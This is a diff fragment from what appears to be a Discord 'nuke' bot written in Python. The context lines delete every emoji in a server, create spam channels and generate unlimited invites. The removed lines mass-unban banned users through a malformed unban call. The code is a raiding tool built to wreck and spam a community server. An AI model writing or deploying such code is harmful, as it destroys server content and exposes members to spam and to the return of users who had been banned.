@@ -84,14 +84,6 @@ async def nuke(ctx):
        print(Fore.MAGENTA + f"{emoji.name} Was deleted" + Fore.RESET)
      except:
        print(Fore.GREEN + f"{emoji.name} Wasn't Deleted" + Fore.RESET)
-    banned_users = await guild.bans()
-    for ban_entry in banned_users:
-      user = ban_entry.user
-      try:
-        await user.unban("YOUR_USERNAME_AND_TAG")
-        print(Fore.MAGENTA + f"{user.name}#{user.discriminator} Was successfully unbanned." + Fore.RESET)
-      except:
-        print(Fore.GREEN + f"{user.name}#{user.discriminator} Was not unbanned." + Fore.RESET)
     await guild.create_text_channel("TEXT_OF_SPAMMED_CHANNELS")
     for channel in guild.text_channels:
         link = await channel.create_invite(max_age = 0, max_uses = 0)
